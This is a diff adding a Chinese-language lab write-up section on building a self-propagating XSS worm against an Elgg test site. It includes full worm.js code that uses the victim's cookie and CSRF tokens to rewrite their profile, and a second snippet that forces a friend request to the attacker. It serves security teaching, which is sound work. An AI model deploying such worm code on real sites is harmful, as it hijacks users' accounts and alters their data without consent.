@@ -139,5 +139,133 @@ Samy不管三七二十一决定先让Alice添加自己为好友再说，通过XS
 
 果然黑客老大Samy已经变成了Alice的好友~
 
+## Writing an XSS Worm
+
+该任务要求通过利用XSS漏洞，在攻击者profile中嵌入Javascript代码，从而盗取用户Cookie，继而修改该用户的profile信息并令其添加自己为好友。和Task4不同的主要就是Task5是直接在用户浏览器上完成的，不需要经过攻击者所在的主机。
+
+### Using Ajax
+
+Ajax全称是Asynchronous JavaScript and XML，即异步的JavaScript和XML。可以简单理解为，这是一种可以在不重新加载整个页面的情况下与服务器交换数据并更新部分网页的技术。在这个任务中JavaScript需要发送HTTP请求，我们可以通过使用XMLHttpRequest对象来实现。不仅可以发送GET请求，也能发送POST请求，但这两种请求的构造方式是不同的，具体的我们还是通过Live HTTP Header插件抓包下来观察。另外，由于这次的代码段比较长，所以不再直接填写在攻击者的profile中，而是封装在一个.js文件内，然后profile中的script加载时调用这个.js文件。
+
+继续上面的故事，Alice看到自己突然多了个新好友Samy，十分迷惑，然后就给随手删掉了。这下Samy不爽了，不过他嫌上次实现的方式太麻烦，还得自己看着抓包然后复制粘贴运行，想想都受不了，那要怎么办呢？他灵机一动，决定直接写个XSS蠕虫，这下只要别人看到他的profile就会被逼按他设定的做，而他写好代码之后只需静静地欣赏就可以了~~
+
+由于代码较长，所以这里不再直接写在profile中，而是通过script标签的src属性进行调用：
+
+![XSS5](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image50.png)
+
+这里的[www.example.com](www.example.com)可以是任意一个攻击者掌控的站点，把worm.js(这次编写的代码)放在服务器中对应的资源目录就可以了。这里我们先在Apache服务器中创建这个站点，修改/etc/apache2/sites-available/目录下的default文件：
+
+![XSS5](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image51.png)
+
+加入站点[www.example.com](www.example.com)的配置信息后，再修改/etc/目录下的hosts文件，把[www.example.com](www.example.com)绑定到本地。
+
+![XSS5](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image52.png)
+
+接下来在/var/www/路径下创建Example文件夹，然后在里面放上worm.js就可以了(当然，得先写好worm.js啊摔)。
+
+实验文档里面给出了一个骨干代码段，当然仅仅是骨干而已…我们要做的是根据修改profile动作进行抓包，然后照着样子填好HTTP请求的头部，然后进行发送。
+
+![XSS5](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image53.png)
+
+获取Cookie，timestamp和token的方式和Task4中的Javascript代码一样，都可以直接通过变量名调用，但我们还需要获取一个参数，就是用户名，除了用户名之外profile其他资料都是我们可以修改的~ 怎样获取用户名呢？有两种方法，第一种上学期学移动Web的时候有提到过一下，可以分为以下几个步骤：
+
+1. 用getElementsByID或者getElementsByClassName函数来提取网页元素对象，后者获取到的是一个数组，可以通过下标访问具体的对象。
+
+2. 通过.attributes提取出该对象的属性。
+
+3. 用getNamedItem(“attributeName”).nodeValue提取出具体的属性值。
+
+接下来就是要找到能提取出用户名的元素了，打开Edit profile页面，在Firefox浏览网页源码首先在网页空白处点击右键，然后选择菜单中的View Page Source选项，这时会打开一个显示网页源码的新窗口：
+
+![XSS5](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image54.png)
+
+Ctrl+F调出搜索页面，找到一个符合我们需求的网页元素对象，这段源码（可左右滑动）如下：
+
+```html
+<img src="http://www.xsslabelgg.com/mod/profile/icondirect.php?lastcache=1463195865&amp;joindate=1410961457&amp;guid=39&amp;size=topbar" alt="Alice" title="Profile" class="elgg-border-plain elgg-transition"/>
+```
+
+这个img对象是调用网页顶部导航栏中用户头像缩略图用的，其中alt属性的值符合我们的需求，非常干净，直接提取出来就可以了，代码如下：
+
+![XSS5](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image55.png)
+
+这个class只有一个元素对象，就是前面的img，所以通过下标0提取出来就可以了，变量user就是我们需要的用户名了。
+
+第二种更简洁，直接使用变量elgg.session.user.username访问就行了~~
+
+整个worm.js代码如下：
+
+```js
+var user = elgg.session.user.username;
+if(user!='samy'){
+    var Ajax=null;
+    // Construct the header information for the HTTP request
+    Ajax=new XMLHttpRequest();
+    if(Ajax==null)
+        alert("Ajax is null");
+    Ajax.open("POST","http://www.xsslabelgg.com/action/profile/edit",true);
+    Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+    Ajax.setRequestHeader("User-Agent","AJAX 1.2");
+    Ajax.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+    Ajax.setRequestHeader("Accept-Language","en-US,en;q=0.5");
+    Ajax.setRequestHeader("Accept-Encoding","gzip, deflate");
+
+    Ajax.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/"+user+"/edit");
+
+    Ajax.setRequestHeader("Cookie",document.cookie);
+    Ajax.setRequestHeader("Connection","keep-alive");
+    Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+    // Construct the content. The format of the content can be learned
+    // from LiveHTTPHeaders.
+    var content="__elgg_token="+elgg.security.token.__elgg_token+"&__elgg_ts="+elgg.security.token.__elgg_ts+"&name="+user+"&description=I'm your father!&guid="+elgg.session.user.guid; // You need to fill in the details.
+    // Send the HTTP POST request.
+    Ajax.setRequestHeader("Content-Length",content.length);
+    Ajax.send(content);
+}
+```
+
+注意，引用的.js文件中是纯Javascript代码。此外，我们可以使用elgg.session.user.guid来提取出用户的ID，这样就不用像CSRF实验那样还得先添加好友再抓包了。
+
+#### 实验前
+
+![XSS5](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image56.png)
+
+#### 实验后
+
+![XSS5](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image57.png)
+
+Alice的Profile被清空了~只留下来自Samy的恶意 I‘m your father！
+
+至于添加为好友的实现方式，也是类似的，观察GET请求包：
+
+![XSS5](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image58.png)
+
+也是依次填充好XMLHttpRequest的各个字段，然后发送：
+
+```js
+var Ajax2=null;
+// Construct the header information for the HTTP request
+Ajax2=new XMLHttpRequest();
+if(Ajax2==null)
+    alert("Ajax2 is null");
+    Ajax2.open("GET","http://www.xsslabelgg.com/action/friends/add?friend="+"42"+"&__elgg_ts="+elgg.security.token.__elgg_ts+"&__elgg_token="+elgg.security.token.__elgg_token,true);
+Ajax2.setRequestHeader("Host","www.xsslabelgg.com");
+Ajax2.setRequestHeader("User-Agent","Ajax2 1.2");
+    Ajax2.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+Ajax2.setRequestHeader("Accept-Language","en-US,en;q=0.5");
+Ajax2.setRequestHeader("Accept-Encoding","gzip, deflate");
+    Ajax2.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/samy");
+
+Ajax2.setRequestHeader("Cookie",document.cookie);
+Ajax2.setRequestHeader("Connection","keep-alive");
+// Send the HTTP POST request.
+Ajax2.send();
+```
+
+GET的不同在于参数直接附加在GET请求的URL尾部，注意这里friend参数是Samy的guid，也即42，而后面的timestamp和token则来自访问Samy profile页的用户。特别地，GET请求没有content，所以最后不需要计算content长度，send函数里面也不需要放上content。
+
+![XSS5](https://raw.githubusercontent.com/familyld/XSS-Attack/master/graph/image59.png)
+
+可以看到Samy果然又被Alice加上了~~
 
 
